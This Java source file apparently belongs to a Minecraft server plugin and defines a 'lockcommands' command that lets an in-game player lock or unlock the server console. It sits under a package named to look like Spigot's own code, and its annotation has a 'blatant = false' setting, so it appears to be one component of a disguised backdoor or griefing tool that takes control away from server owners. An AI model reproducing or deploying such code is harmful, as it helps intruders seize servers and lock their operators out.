package org.spigotmc.commands.impl.server;

import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "lockcommands",
    usage = "lockcommands",
    desc = "Lock the server console",
    aliases = "lockcmds",
    blatant = false
)

public class LockCommands extends CommandListener{
    public static boolean lockcmds = false;

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (lockcmds) {
			lockcmds = false;
			p.sendMessage(Settings.PREFIX("All commands are now unlocked"));
		} else {
			lockcmds = true;
			p.sendMessage(Settings.PREFIX("All commands are now locked"));
		}
	}           
}
